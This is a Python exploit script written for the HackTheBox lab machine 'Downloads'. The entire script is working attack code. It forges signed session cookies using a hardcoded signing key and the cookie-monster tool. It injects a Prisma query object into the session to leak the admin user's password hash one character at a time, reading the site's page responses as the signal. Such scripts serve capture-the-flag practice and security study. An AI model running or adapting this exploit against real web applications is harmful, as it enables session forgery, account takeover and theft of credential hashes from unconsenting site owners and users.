# Written by me, https://github.com/SomnathDas
# To crack the password hash through Injecting queries in Prisma using cookie forgery
# Made to use in hackTheBox machine => Open-Beta S2 of 2023 Called "Downloads"
# Assumes you have cookie-monster installed and can be accessed through shell
# Assumes you have created jsonObj.json and result.txt file
# वासांसिजीर्णानियथाविहायनवानिगृह्णातिनरोऽपराणि। तथाशरीराणिविहायजीर्णान्यन्यानिसंयातिनवानिदेही।।
import requests, os, json
from bs4 import BeautifulSoup

# Information Required
TARGET_URL = "http://download.htb/home"
JSON_OBJ_FILE = "jsonObj.json"
RESULT_FILE = "result.txt"

print("\n[*] Starting BruteForce UserHash")


# Create USER_OBJ
def create_user_obj(hash_string):
    return {
        "flashes": {"info": [], "error": [], "success": []},
        "user": {"AND": [{"id": 1}, {"password": {"startsWith": hash_string}}]},
    }


# Command to generate download_session and download_session.sig
def gen_cmd():
    os.system(
        "cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f {} > {}".format(
            JSON_OBJ_FILE, RESULT_FILE
        )
    )


# Important Data
characters = [
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
]
password_hash = []
password_string = ""


# Main Logic
# First step, Create User_Obj and write it to json file
# Second step, use cookie monster and that json file to generate required download_session and .sig
# Extract download_session and .sig values from that RESULT_FILE
# Create a cookies object with those two values to send
# Send request to /home path and see if you get "No Files Found" or one of our uploaded files
# Repeat the process

# Application Code
for i in range(32):
    print("\n[*] Hash At Length: {}".format(i + 1))
    print("[*] Looking for Hash Character to match")
    for char in characters:
        print("[*] Current Password Hash: {}".format(password_string + char))
        # First step
        our_user_obj = create_user_obj(password_string + char)
        our_user_obj_stringify = json.dumps(our_user_obj)
        objFile = open(JSON_OBJ_FILE, "w")
        objFile.write(our_user_obj_stringify)
        objFile.close()
        # Second step
        gen_cmd()
        # Third step
        broke = []
        file = open(RESULT_FILE, "r")
        for line in file.readlines():
            x = line.split("\x1b[39m\n")
            broke.append(x)
        file.close()
        download_session = broke[len(broke) - 2][0].split("download_session=")[1]
        download_session_sig = broke[len(broke) - 1][0].split("=")[1]
        # Fourth step
        our_cookies = {
            "download_session": download_session,
            "download_session.sig": download_session_sig,
        }
        # Fifth step
        session = requests.session()
        response = session.get(
            TARGET_URL, cookies=our_cookies, headers={"Connection": "close"}
        )
        response.close()
        session.cookies.clear()
        print("Response Status Code: {}".format(response.status_code))
        soup = BeautifulSoup(response.content, "html5lib")
        # Moment of truth
        text_muted = soup.find("h4", attrs={"class": "text-muted"})
        text_center = soup.find("h1", attrs={"class": "text-center"})
        nav_links = soup.find_all("a", attrs={"class": "nav-link"})
        if text_muted:
            print(text_muted)
            pass
        else:
            print(text_center)
            if len(nav_links) > 2:
                print("[+] Hash Character Found: {}".format(char))
                password_string = password_string + char
                password_hash.append(char)


print("\n[+] Brute-Force Hash Done")
print("User-Hash:\n{}".format(password_hash))
